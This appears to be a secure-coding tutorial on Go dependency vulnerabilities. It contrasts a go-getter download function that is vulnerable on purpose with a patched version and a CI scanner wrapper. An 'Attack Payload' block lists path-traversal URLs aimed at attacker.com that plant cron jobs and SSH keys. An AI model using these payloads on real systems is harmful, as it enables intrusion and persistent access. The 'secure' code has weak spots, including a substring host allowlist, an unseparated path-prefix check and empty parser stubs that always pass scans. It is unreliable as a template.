Go module dependency management requires careful attention to version pinning and vulnerability scanning. Many Go projects suffered from vulnerable dependencies like the go-getter path traversal (CVE-2024-6257) that affected HashiCorp's entire ecosystem.

**VULNERABLE CODE**:

```go
package main

import (
	"fmt"
	"log"

	"github.com/hashicorp/go-getter"
)

// go.mod with unpinned/vulnerable dependency
// module myproject
// go 1.21
// require github.com/hashicorp/go-getter v1.7.0 // VULNERABLE VERSION

func downloadModule(source, destination string) error {
	// Directly using user-provided source URL without validation
	// Vulnerable go-getter version allows path traversal
	client := &getter.Client{
		Src:  source,      // Attacker-controlled URL
		Dst:  destination, // Target directory
		Mode: getter.ClientModeAny,
	}

	err := client.Get()
	if err != nil {
		return fmt.Errorf("failed to download: %w", err)
	}

	log.Printf("Downloaded module from %s to %s", source, destination)
	return nil
}

func main() {
	// User provides module source - could be malicious
	source := "git::https://github.com/attacker/malicious-module.git//subdir/../../../etc/cron.d"
	dest := "/tmp/modules"

	if err := downloadModule(source, dest); err != nil {
		log.Fatal(err)
	}
}
```

**Attack Payload**:
```text
git::https://attacker.com/malicious.git//subdir/../../../etc/cron.d/backdoor
git::https://attacker.com/exploit.git//../../../root/.ssh/authorized_keys
s3::https://bucket.s3.amazonaws.com/path/../../../var/spool/cron/root
```

**Why This Is Dangerous**:
- Uses vulnerable version of go-getter (< v1.7.5) with path traversal vulnerability
- No input validation on source URLs allows malicious paths
- go.mod doesn't pin to secure versions, allowing vulnerable transitive dependencies
- No vulnerability scanning in development workflow
- Attacker can write arbitrary files to system, leading to RCE via cron jobs or SSH keys

**SECURE VERSION**:

```go
package main

import (
	"context"
	"fmt"
	"log"
	"net/url"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/hashicorp/go-getter/v2" // Updated to v2 with security fixes
)

// go.mod with pinned secure version
// module myproject
// go 1.21
// require github.com/hashicorp/go-getter/v2 v2.2.1 // Patched version

var (
	allowedHosts    = []string{"github.com", "gitlab.com", "bitbucket.org"}
	pathTraversalRe = regexp.MustCompile(`\.\./|\.\\|%2e%2e`)
)

func validateSourceURL(source string) error {
	// Check for path traversal patterns
	if pathTraversalRe.MatchString(strings.ToLower(source)) {
		return fmt.Errorf("path traversal detected in source URL")
	}

	// Parse and validate URL
	parsed, err := url.Parse(source)
	if err != nil {
		return fmt.Errorf("invalid URL: %w", err)
	}

	// Whitelist allowed hosts
	hostAllowed := false
	for _, allowed := range allowedHosts {
		if strings.Contains(parsed.Host, allowed) {
			hostAllowed = true
			break
		}
	}
	if !hostAllowed {
		return fmt.Errorf("host %s not in allowlist", parsed.Host)
	}

	return nil
}

func validateDestination(dest, baseDir string) error {
	// Ensure destination is within allowed base directory
	absDest, err := filepath.Abs(dest)
	if err != nil {
		return fmt.Errorf("invalid destination path: %w", err)
	}

	absBase, err := filepath.Abs(baseDir)
	if err != nil {
		return fmt.Errorf("invalid base path: %w", err)
	}

	if !strings.HasPrefix(absDest, absBase) {
		return fmt.Errorf("destination must be within %s", baseDir)
	}

	return nil
}

func downloadModuleSecure(source, destination, baseDir string) error {
	// Validate source URL
	if err := validateSourceURL(source); err != nil {
		return fmt.Errorf("source validation failed: %w", err)
	}

	// Validate destination path
	if err := validateDestination(destination, baseDir); err != nil {
		return fmt.Errorf("destination validation failed: %w", err)
	}

	// Use context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	// Configure secure client
	req := &getter.Request{
		Src:     source,
		Dst:     destination,
		GetMode: getter.ModeDir,
	}

	// Use updated getter with security patches
	client := getter.DefaultClient
	_, err := client.Get(ctx, req)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}

	log.Printf("Securely downloaded module from %s", source)
	return nil
}
```

**Key Security Controls**:
- **Pinned Dependencies**: go.mod specifies exact patched version (v2.2.1+) without vulnerabilities
- **URL Validation**: Source URLs checked for path traversal patterns and whitelisted hosts
- **Path Containment**: Destination validated to prevent writes outside allowed directories
- **Context Timeout**: Prevents hanging downloads from causing resource exhaustion
- **Updated Library**: Uses go-getter v2 with security improvements

Automated vulnerability scanning requires multiple tools integrated into your CI/CD pipeline, with special attention to transitive dependencies which are often the source of vulnerabilities like Log4Shell or the go-getter issue.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

// VulnerabilityReport represents scan results
type VulnerabilityReport struct {
	Timestamp   time.Time       `json:"timestamp"`
	Module      string          `json:"module"`
	Findings    []Finding       `json:"findings"`
	Summary     ScanSummary     `json:"summary"`
	ExitCode    int             `json:"exit_code"`
}

type Finding struct {
	Package       string   `json:"package"`
	Version       string   `json:"version"`
	VulnID        string   `json:"vuln_id"`
	Severity      string   `json:"severity"`
	FixedVersion  string   `json:"fixed_version"`
	Description   string   `json:"description"`
	Transitive    bool     `json:"transitive"`
	CallPaths     []string `json:"call_paths,omitempty"`
}

type ScanSummary struct {
	Critical int `json:"critical"`
	High     int `json:"high"`
	Medium   int `json:"medium"`
	Low      int `json:"low"`
	Total    int `json:"total"`
}

// DependencyScanner manages vulnerability scanning
type DependencyScanner struct {
	ProjectPath       string
	FailOnSeverity    string
	IgnoredVulns      []string
	AllowedLicenses   []string
	MaxVulnAge        time.Duration
	EnableGovulncheck bool
	EnableNancy       bool
	EnableTrivy       bool
}

func NewDependencyScanner(projectPath string) *DependencyScanner {
	return &DependencyScanner{
		ProjectPath:       projectPath,
		FailOnSeverity:    "HIGH",
		IgnoredVulns:      []string{},
		AllowedLicenses:   []string{"MIT", "Apache-2.0", "BSD-3-Clause", "BSD-2-Clause"},
		MaxVulnAge:        30 * 24 * time.Hour, // 30 days to remediate
		EnableGovulncheck: true,
		EnableNancy:       true,
		EnableTrivy:       true,
	}
}

// RunGovulncheck uses Go's official vulnerability scanner
func (s *DependencyScanner) RunGovulncheck(ctx context.Context) ([]Finding, error) {
	log.Println("Running govulncheck (official Go vulnerability database)...")

	cmd := exec.CommandContext(ctx, "govulncheck", "-json", "./...")
	cmd.Dir = s.ProjectPath

	output, err := cmd.Output()
	if err != nil {
		// govulncheck returns non-zero on findings - that's expected
		if exitErr, ok := err.(*exec.ExitError); ok {
			log.Printf("govulncheck found vulnerabilities (exit code: %d)", exitErr.ExitCode())
		} else {
			return nil, fmt.Errorf("govulncheck execution failed: %w", err)
		}
	}

	return s.parseGovulncheckOutput(output)
}

// RunNancy scans go.sum against Sonatype OSS Index
func (s *DependencyScanner) RunNancy(ctx context.Context) ([]Finding, error) {
	log.Println("Running nancy (Sonatype OSS Index)...")

	// Generate go list output for nancy
	listCmd := exec.CommandContext(ctx, "go", "list", "-json", "-deps", "./...")
	listCmd.Dir = s.ProjectPath

	nancyCmd := exec.CommandContext(ctx, "nancy", "sleuth", "--output", "json")
	nancyCmd.Dir = s.ProjectPath

	pipe, err := listCmd.StdoutPipe()
	if err != nil {
		return nil, fmt.Errorf("failed to create pipe: %w", err)
	}
	nancyCmd.Stdin = pipe

	if err := listCmd.Start(); err != nil {
		return nil, fmt.Errorf("go list failed: %w", err)
	}

	output, _ := nancyCmd.Output()
	listCmd.Wait()

	return s.parseNancyOutput(output)
}

// RunTrivy uses Trivy for comprehensive scanning
func (s *DependencyScanner) RunTrivy(ctx context.Context) ([]Finding, error) {
	log.Println("Running trivy (filesystem scan)...")

	cmd := exec.CommandContext(ctx, "trivy", "fs",
		"--format", "json",
		"--scanners", "vuln",
		"--severity", "CRITICAL,HIGH,MEDIUM",
		s.ProjectPath,
	)

	output, err := cmd.Output()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			log.Printf("trivy found issues (exit code: %d)", exitErr.ExitCode())
		} else {
			return nil, fmt.Errorf("trivy execution failed: %w", err)
		}
	}

	return s.parseTrivyOutput(output)
}

// FullScan runs all enabled scanners and aggregates results
func (s *DependencyScanner) FullScan(ctx context.Context) (*VulnerabilityReport, error) {
	report := &VulnerabilityReport{
		Timestamp: time.Now().UTC(),
		Module:    s.ProjectPath,
		Findings:  []Finding{},
	}

	findingsMap := make(map[string]Finding) // Deduplicate by vuln ID + package

	if s.EnableGovulncheck {
		findings, err := s.RunGovulncheck(ctx)
		if err != nil {
			log.Printf("WARNING: govulncheck failed: %v", err)
		} else {
			for _, f := range findings {
				key := fmt.Sprintf("%s:%s", f.VulnID, f.Package)
				findingsMap[key] = f
			}
		}
	}

	if s.EnableNancy {
		findings, err := s.RunNancy(ctx)
		if err != nil {
			log.Printf("WARNING: nancy failed: %v", err)
		} else {
			for _, f := range findings {
				key := fmt.Sprintf("%s:%s", f.VulnID, f.Package)
				if _, exists := findingsMap[key]; !exists {
					findingsMap[key] = f
				}
			}
		}
	}

	if s.EnableTrivy {
		findings, err := s.RunTrivy(ctx)
		if err != nil {
			log.Printf("WARNING: trivy failed: %v", err)
		} else {
			for _, f := range findings {
				key := fmt.Sprintf("%s:%s", f.VulnID, f.Package)
				if _, exists := findingsMap[key]; !exists {
					findingsMap[key] = f
				}
			}
		}
	}

	// Process findings
	for _, finding := range findingsMap {
		if !s.isIgnored(finding.VulnID) {
			report.Findings = append(report.Findings, finding)
			s.updateSummary(&report.Summary, finding.Severity)
		}
	}

	report.Summary.Total = len(report.Findings)
	report.ExitCode = s.determineExitCode(report)

	return report, nil
}

func (s *DependencyScanner) isIgnored(vulnID string) bool {
	for _, ignored := range s.IgnoredVulns {
		if ignored == vulnID {
			return true
		}
	}
	return false
}

func (s *DependencyScanner) updateSummary(summary *ScanSummary, severity string) {
	switch strings.ToUpper(severity) {
	case "CRITICAL":
		summary.Critical++
	case "HIGH":
		summary.High++
	case "MEDIUM":
		summary.Medium++
	case "LOW":
		summary.Low++
	}
}

func (s *DependencyScanner) determineExitCode(report *VulnerabilityReport) int {
	switch s.FailOnSeverity {
	case "CRITICAL":
		if report.Summary.Critical > 0 {
			return 1
		}
	case "HIGH":
		if report.Summary.Critical > 0 || report.Summary.High > 0 {
			return 1
		}
	case "MEDIUM":
		if report.Summary.Critical > 0 || report.Summary.High > 0 || report.Summary.Medium > 0 {
			return 1
		}
	}
	return 0
}

// Placeholder parsers - implement based on actual tool output formats
func (s *DependencyScanner) parseGovulncheckOutput(output []byte) ([]Finding, error) {
	// Parse govulncheck JSON output
	return []Finding{}, nil
}

func (s *DependencyScanner) parseNancyOutput(output []byte) ([]Finding, error) {
	return []Finding{}, nil
}

func (s *DependencyScanner) parseTrivyOutput(output []byte) ([]Finding, error) {
	return []Finding{}, nil
}

func main() {
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
	defer cancel()

	scanner := NewDependencyScanner(".")
	scanner.FailOnSeverity = os.Getenv("VULN_FAIL_SEVERITY")
	if scanner.FailOnSeverity == "" {
		scanner.FailOnSeverity = "HIGH"
	}

	report, err := scanner.FullScan(ctx)
	if err != nil {
		log.Fatalf("Scan failed: %v", err)
	}

	// Output JSON report
	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	enc.Encode(report)

	if report.ExitCode != 0 {
		log.Printf("SECURITY GATE FAILED: Found %d critical, %d high severity vulnerabilities",
			report.Summary.Critical, report.Summary.High)
		os.Exit(report.ExitCode)
	}

	log.Println("Security scan passed")
}
